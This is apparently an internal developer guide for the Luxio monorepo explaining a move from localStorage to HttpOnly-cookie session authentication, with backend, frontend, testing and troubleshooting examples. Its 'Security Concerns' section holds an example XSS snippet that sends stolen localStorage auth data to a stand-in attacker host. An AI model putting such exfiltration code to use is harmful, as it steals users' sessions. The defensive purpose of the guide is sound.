# Authentication Security Guide

## Overview

This document describes the secure authentication implementation used across the Luxio monorepo. Our approach prioritizes security by using **HttpOnly cookies** for session management instead of storing sensitive data in `localStorage`.

## Security Concerns with localStorage

### Why localStorage is Dangerous for Auth Data

1. **XSS Vulnerability**: Any JavaScript code (including malicious scripts injected via XSS attacks) can read localStorage
2. **No Expiration Control**: Data persists until explicitly deleted, even after browser restart
3. **Plain Text Storage**: Sensitive user information stored without encryption
4. **Cross-Origin Risks**: Potential leakage through misconfigured CORS or third-party scripts

Example attack scenario:
```javascript
// Malicious script injected via XSS can steal all auth data
const userData = localStorage.getItem('luxio_auth');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: userData
});
```

## Our Secure Solution

### Architecture

```
┌─────────────────┐         HttpOnly Cookie        ┌──────────────┐
│   Browser       │ ◄────────────────────────────► │   Backend    │
│                 │                                │              │
│  • Memory-only  │      Session Validation        │  • Session   │
│    auth state   │ ◄────────────────────────────► │    Store     │
│  • No localStorage                              │  • User DB   │
│    for auth     │      Profile Fetch             │              │
│                 │ ◄────────────────────────────► │              │
└─────────────────┘                                └──────────────┘
```

### Key Components

#### 1. HttpOnly Cookies (Backend Managed)

The backend sets session cookies with these flags:
- **HttpOnly**: JavaScript cannot access the cookie
- **Secure**: Only sent over HTTPS
- **SameSite=Strict**: Prevents CSRF attacks
- **Path=/**: Available to all routes

Example backend response header:
```
Set-Cookie: SESSION_ID=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
```

#### 2. In-Memory State Management (Frontend)

The `AuthStore` class maintains authentication state only in memory:
- No persistence to localStorage/sessionStorage
- State lost on page refresh (security feature, not bug)
- Re-validated from backend on initialization

#### 3. Automatic Session Validation

- **Periodic checks**: Every 5 minutes
- **Visibility change**: When user returns to tab
- **Before critical actions**: Optional pre-flight validation

### Implementation Details

#### AuthStore Features

```typescript
import { authStore } from '@julyware/common';

// Subscribe to auth state changes
const unsubscribe = authStore.subscribe((state) => {
  console.log('Auth state:', state.isAuthenticated, state.user);
});

// Get current state
const currentState = authStore.getState();

// Refresh user profile from backend
await authStore.refreshUserProfile();

// Logout (clears server session + client state)
await authStore.logout();
```

#### React Integration

```tsx
import { useAuthStore } from '@julyware/common';

function MyComponent() {
  const { state, setUser, logout } = useAuthStore();
  
  if (state.loading) return <LoadingSpinner />;
  if (!state.isAuthenticated) return <LoginPrompt />;
  
  return <div>Welcome, {state.user?.name}</div>;
}
```

## Migration Guide

### For Backend Developers

Ensure your authentication endpoints:

1. **Login Endpoint** (`POST /api/auth/signin`)
   ```java
   // After successful authentication
   Cookie sessionCookie = new Cookie("SESSION_ID", sessionId);
   sessionCookie.setHttpOnly(true);
   sessionCookie.setSecure(true);  // production only
   sessionCookie.setPath("/");
   sessionCookie.setMaxAge(3600);  // 1 hour
   sessionCookie.setAttribute("SameSite", "Strict");
   response.addCookie(sessionCookie);
   
   // Return user data in response body
   response.setContentType("application/json");
   response.getWriter().write(jsonUserData);
   ```

2. **Profile Endpoint** (`GET /api/auth/profile`)
   - Read session from HttpOnly cookie
   - Validate session
   - Return user data or 401 if invalid

3. **Logout Endpoint** (`POST /api/auth/logout`)
   - Invalidate session server-side
   - Clear cookie: `Set-Cookie: SESSION_ID=; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=0`

4. **Validation Endpoint** (`GET /api/auth/validate`) - Optional
   - Quick check if session is valid
   - Return 200 OK or 401 Unauthorized

### For Frontend Developers

**Before (Insecure):**
```typescript
// ❌ DON'T DO THIS
localStorage.setItem('user', JSON.stringify(userData));
const user = JSON.parse(localStorage.getItem('user'));
```

**After (Secure):**
```typescript
// ✅ DO THIS
import { authStore } from '@julyware/common';

// Set user after login (stored in memory only)
authStore.setUser(userData);

// Access current user
const { user, isAuthenticated } = authStore.getState();

// Subscribe to changes
authStore.subscribe((state) => {
  updateUI(state);
});
```

## Security Best Practices

### 1. Always Use HTTPS in Production

HttpOnly cookies with `Secure` flag require HTTPS:
```nginx
# nginx configuration
server {
    listen 443 ssl;
    # SSL certificate configuration...
}
```

### 2. Implement Content Security Policy (CSP)

Prevent XSS attacks at the source:
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' 'unsafe-inline';">
```

### 3. Use CSRF Tokens for State-Changing Operations

Even with SameSite cookies, add CSRF protection:
```typescript
// Get CSRF token from cookie
const csrfToken = document.cookie
  .split('; ')
  .find(row => row.startsWith('XSRF-TOKEN='))
  ?.split('=')[1];

// Include in requests
fetch('/api/auth/logout', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'X-XSRF-TOKEN': csrfToken || ''
  }
});
```

### 4. Sanitize All User Input

Prevent XSS at the application layer:
```typescript
// Escape HTML before rendering
function escapeHtml(text: string): string {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}
```

### 5. Implement Rate Limiting

Protect authentication endpoints:
```java
// Spring Security example
@Configuration
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf.csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse()))
            .sessionManagement(session -> 
                session.maximumSessions(1).expiredUrl("/signin?expired"));
        return http.build();
    }
}
```

## Testing Security

### Manual Testing Checklist

- [ ] Verify no auth data in localStorage: Open DevTools → Application → Local Storage
- [ ] Check cookie flags: DevTools → Application → Cookies → Verify HttpOnly and Secure flags
- [ ] Test XSS resistance: Try `console.log(document.cookie)` - should not show session cookie
- [ ] Verify session timeout: Wait for expiration, then try authenticated action
- [ ] Test logout: Verify cookie is cleared and session invalidated

### Automated Security Tests

```typescript
describe('Authentication Security', () => {
  test('should not store user data in localStorage', () => {
    authStore.setUser(mockUser);
    expect(localStorage.getItem('luxio_auth')).toBeNull();
  });

  test('should clear state on logout', async () => {
    authStore.setUser(mockUser);
    await authStore.logout();
    expect(authStore.getState().isAuthenticated).toBe(false);
    expect(authStore.getState().user).toBeNull();
  });

  test('should re-validate on page refresh', async () => {
    // Simulate page load
    const store = new AuthStore();
    await new Promise(resolve => setTimeout(resolve, 100));
    
    // Should have called /api/auth/profile
    expect(fetch).toHaveBeenCalledWith('/api/auth/profile', expect.any(Object));
  });
});
```

## Troubleshooting

### Issue: User logged out on page refresh

**Expected behavior**: The app re-validates the session with the backend. If the session is still valid on the server, the user stays logged in.

**If this fails**:
1. Check that the session cookie is being sent: DevTools → Network → Check request headers for `Cookie: SESSION_ID=...`
2. Verify backend session hasn't expired
3. Check CORS settings allow credentials: `Access-Control-Allow-Credentials: true`

### Issue: CORS errors with credentials

**Solution**: Backend must explicitly allow credentials:
```java
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins("https://yourdomain.com")
            .allowCredentials(true)  // Critical!
            .allowedMethods("GET", "POST", "PUT", "DELETE");
    }
}
```

### Issue: Cookie not being set

**Checklist**:
1. Response includes `Set-Cookie` header
2. Domain matches (cookie domain must match or be parent of current domain)
3. Path is correct (usually `/`)
4. Not blocked by browser privacy settings

## Additional Resources

- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [MDN: HttpOnly Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies)
- [Spring Security Documentation](https://spring.io/guides/topicals/spring-security-architecture/)

## Questions?

If you encounter security issues or have questions about the implementation, please:
1. Check this documentation
2. Review the `packages/common/src/auth.ts` implementation
3. Contact the security team for critical vulnerabilities

---

**Last Updated**: 2026-04-27  
**Version**: 2.0 (Secure Cookie-Based Authentication)